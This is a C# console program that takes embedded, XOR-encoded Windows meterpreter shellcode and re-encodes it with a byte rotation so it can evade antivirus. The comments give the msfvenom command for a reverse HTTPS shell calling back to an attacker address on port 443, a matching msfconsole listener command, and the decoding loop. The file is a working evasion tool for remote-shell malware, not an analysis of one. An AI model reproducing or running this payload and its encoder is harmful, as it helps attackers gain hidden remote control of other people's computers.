using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp2
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.197 LPORT=443 EXITFUNC=thread -f ps1
            // XORed with xor_shellcode.py key 0xfa
            // sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.49.102; set lport 443; exploit"
            byte[] buf = new byte[723] { 0xeb, 0x27, 0x5b, 0x53, 0x5f, 0xb0, 0x47, 0xfc, 0xae, 0x75, 0xfd, 0x57, 0x59, 0x53, 0x5e, 0x8a, 0x6, 0x30, 0x7, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc6, 0x66, 0x81, 0x3f, 0x3d, 0x50, 0x74, 0x7, 0x80, 0x3e, 0x47, 0x75, 0xea, 0xeb, 0xe6, 0xff, 0xe1, 0xe8, 0xd4, 0xff, 0xff, 0xff, 0x9, 0x17, 0x3, 0x47, 0xf5, 0x5f, 0x80, 0xed, 0xe7, 0xeb, 0xc5, 0x17, 0x3, 0x9, 0x56, 0x52, 0x48, 0x47, 0x51, 0x58, 0x41, 0x4b, 0x38, 0xc5, 0x66, 0x41, 0x9c, 0x51, 0x69, 0x5f, 0x88, 0x5b, 0xf, 0x4b, 0x82, 0x45, 0x23, 0x44, 0x26, 0xca, 0x41, 0x18, 0xb4, 0x43, 0x5d, 0x4b, 0x82, 0x65, 0x53, 0x41, 0x26, 0xc3, 0xa5, 0x2b, 0x62, 0x75, 0x15, 0x2f, 0x29, 0x56, 0xc2, 0xc0, 0x1a, 0x42, 0x8, 0xd6, 0xe1, 0xe4, 0x45, 0x4b, 0x82, 0x45, 0x23, 0x82, 0x55, 0x3f, 0x48, 0x46, 0x4b, 0x8, 0xc7, 0x65, 0x88, 0x6f, 0x1b, 0x2, 0x15, 0xc, 0x8c, 0x65, 0x3, 0x9, 0x17, 0x88, 0x89, 0x9f, 0x3, 0x9, 0x17, 0x4b, 0x8c, 0xd7, 0x77, 0x6e, 0x5f, 0x2, 0xd9, 0x47, 0x47, 0x82, 0x57, 0x23, 0x82, 0x5f, 0x1b, 0x40, 0x16, 0xd3, 0xea, 0x41, 0x4e, 0x38, 0xde, 0x4b, 0xf6, 0xde, 0x42, 0x82, 0x23, 0x8b, 0x41, 0x16, 0xd5, 0x41, 0x26, 0xc3, 0x48, 0xd6, 0xca, 0x4, 0xbb, 0x42, 0x8, 0xd6, 0x3b, 0xe9, 0x62, 0xf2, 0x45, 0x14, 0x4f, 0x2d, 0x1f, 0x46, 0x30, 0xc6, 0x76, 0xd1, 0x4f, 0x47, 0x82, 0x57, 0x27, 0x40, 0x16, 0xd3, 0x6f, 0x56, 0x88, 0x5, 0x5f, 0x47, 0x82, 0x57, 0x1f, 0x40, 0x16, 0xd3, 0x48, 0x9c, 0x7, 0x81, 0x56, 0x5b, 0x48, 0x4f, 0x5d, 0x50, 0x5f, 0x2, 0xd9, 0x4d, 0x42, 0x51, 0x56, 0x5a, 0x48, 0x4d, 0x4b, 0x8a, 0xfb, 0x23, 0x48, 0x45, 0xfc, 0xe9, 0x4f, 0x42, 0x50, 0x4d, 0x4b, 0x82, 0x5, 0xea, 0x42, 0xe8, 0xfc, 0xf6, 0x4a, 0x4b, 0x38, 0xcc, 0x50, 0x40, 0xa9, 0x74, 0x60, 0x79, 0x6a, 0x67, 0x72, 0x77, 0x9, 0x56, 0x55, 0x41, 0x9e, 0xe2, 0x40, 0xd0, 0xc1, 0x45, 0x60, 0x25, 0xe, 0xe8, 0xd6, 0x5a, 0x44, 0x4b, 0x80, 0xf6, 0x50, 0x53, 0x5a, 0x32, 0xc9, 0x5a, 0x32, 0xc0, 0x44, 0x50, 0x40, 0xad, 0x39, 0x5f, 0x6e, 0xa4, 0x9, 0x17, 0x3, 0x9, 0xe8, 0xd6, 0xe1, 0x18, 0x3, 0x9, 0x17, 0x32, 0x30, 0x25, 0x2d, 0x38, 0x21, 0x3b, 0x27, 0x23, 0x36, 0x27, 0x26, 0x3a, 0x3e, 0x17, 0x59, 0x41, 0x9e, 0xc2, 0x40, 0xd0, 0xc3, 0xb2, 0x16, 0x3, 0x9, 0x5a, 0x32, 0xc0, 0x44, 0x50, 0x63, 0x14, 0x50, 0x40, 0xad, 0x54, 0x80, 0x88, 0xc5, 0x9, 0x17, 0x3, 0x9, 0xe8, 0xd6, 0xe1, 0x63, 0x3, 0x9, 0x17, 0x2c, 0x4a, 0x4e, 0x52, 0x42, 0x72, 0x57, 0x73, 0x26, 0x51, 0x62, 0x48, 0x57, 0x7a, 0x73, 0x48, 0x73, 0x63, 0x7b, 0x48, 0x63, 0x54, 0x58, 0x20, 0x50, 0x6c, 0x7c, 0x54, 0x6c, 0x26, 0x6c, 0x7d, 0x76, 0x37, 0x51, 0x43, 0x67, 0x6c, 0x62, 0x50, 0x63, 0x58, 0x77, 0x50, 0x5b, 0x73, 0x7d, 0x26, 0x56, 0x38, 0x66, 0x7a, 0x58, 0x5b, 0x73, 0x46, 0x74, 0x42, 0x7c, 0x59, 0x67, 0x42, 0x24, 0x54, 0x5b, 0x79, 0x3b, 0x51, 0x7f, 0x49, 0x4d, 0x7e, 0x6f, 0x4e, 0x58, 0x77, 0x6a, 0x74, 0x64, 0x62, 0x24, 0x5a, 0x6e, 0x46, 0x6a, 0x3f, 0x67, 0x65, 0x48, 0x62, 0x6f, 0x41, 0x5e, 0x33, 0x4b, 0x7c, 0x31, 0x79, 0x22, 0x67, 0x3e, 0x46, 0x37, 0x6a, 0x7a, 0x4c, 0x45, 0x42, 0x55, 0x53, 0x4f, 0x6b, 0x58, 0x4d, 0x47, 0x9, 0x5f, 0x8a, 0xc8, 0x44, 0x59, 0x48, 0x4f, 0x4e, 0x38, 0xde, 0x50, 0x41, 0xaf, 0x3, 0x3b, 0xbf, 0x87, 0x9, 0x17, 0x3, 0x9, 0x47, 0x50, 0x5a, 0x5e, 0xc4, 0xcb, 0xfc, 0x56, 0x27, 0x2c, 0xfc, 0xdc, 0x5f, 0x8a, 0xcf, 0x7d, 0x9, 0x56, 0x5f, 0x8a, 0xf8, 0x7d, 0x1c, 0x53, 0x45, 0x6b, 0x89, 0x24, 0x3, 0x9, 0x5e, 0x8a, 0xe9, 0x7d, 0x7, 0x48, 0x4e, 0x4a, 0xb3, 0x62, 0x45, 0x97, 0x91, 0x3, 0x9, 0x17, 0x3, 0xf6, 0xc2, 0x4e, 0x38, 0xd7, 0x50, 0x53, 0x5f, 0x8a, 0xf8, 0x5a, 0x32, 0xc0, 0x5a, 0x32, 0xc0, 0x44, 0x50, 0x40, 0xd0, 0xc1, 0x24, 0x11, 0x1b, 0x72, 0xe8, 0xd6, 0x8c, 0xd7, 0x76, 0x16, 0x5f, 0xc4, 0xc8, 0x9f, 0x10, 0x9, 0x17, 0x4a, 0xb3, 0x53, 0xf3, 0x3c, 0xf7, 0x3, 0x9, 0x17, 0x3, 0xf6, 0xc2, 0x4b, 0xf6, 0xd8, 0x77, 0xb, 0xfc, 0xa9, 0xe1, 0x42, 0x3, 0x9, 0x17, 0x50, 0x50, 0x7d, 0x43, 0x53, 0x5e, 0x8a, 0xd8, 0xd6, 0xe1, 0x19, 0x5e, 0xc4, 0xc9, 0x17, 0x13, 0x9, 0x17, 0x4a, 0xb3, 0x4f, 0xa7, 0x5a, 0xf2, 0x3, 0x9, 0x17, 0x3, 0xf6, 0xc2, 0x4b, 0x9a, 0x44, 0x50, 0x41, 0x9e, 0xe4, 0x41, 0x9e, 0xf2, 0x41, 0x9e, 0xd9, 0x40, 0xd0, 0xc3, 0x9, 0x37, 0x3, 0x9, 0x5e, 0x8a, 0xf0, 0x5e, 0xb9, 0x1b, 0x81, 0x8a, 0xeb, 0x17, 0x3, 0x9, 0x17, 0xfc, 0xdc, 0x5f, 0x80, 0xcd, 0x37, 0x86, 0xc9, 0x63, 0xb1, 0x6f, 0x9c, 0x4, 0x41, 0x16, 0xc0, 0x8c, 0xd7, 0x76, 0xdb, 0x4f, 0xc0, 0x51, 0x7d, 0x3, 0x50, 0xac, 0xe3, 0x14, 0x3d, 0x9, 0x48, 0x9e, 0xd9, 0xf6, 0xc2, 0x3d, 0x50 };

            if (args.Length == 0)
            {
                System.Console.WriteLine("Please enter a numeric argument for the number of rotations.");
                return;
            }

            int rotNo = int.Parse(args[0]);

            // Encode the payload with rotation
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + rotNo) & 0xFF);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];

                if ((count + 1) == totalCount) // Dont append comma for last item
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }
            }

            Console.WriteLine($"ROT{rotNo} payload:");
            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{ {hex} }};");

            //// Decode the ROTxx payload (make sure to change rotations)
            // for (int i = 0; i < buf.Length; i++)
            // {
            //    buf[i] = (byte)(((uint)buf[i] - 37) & 0xFF);
            //}

        }
    }
}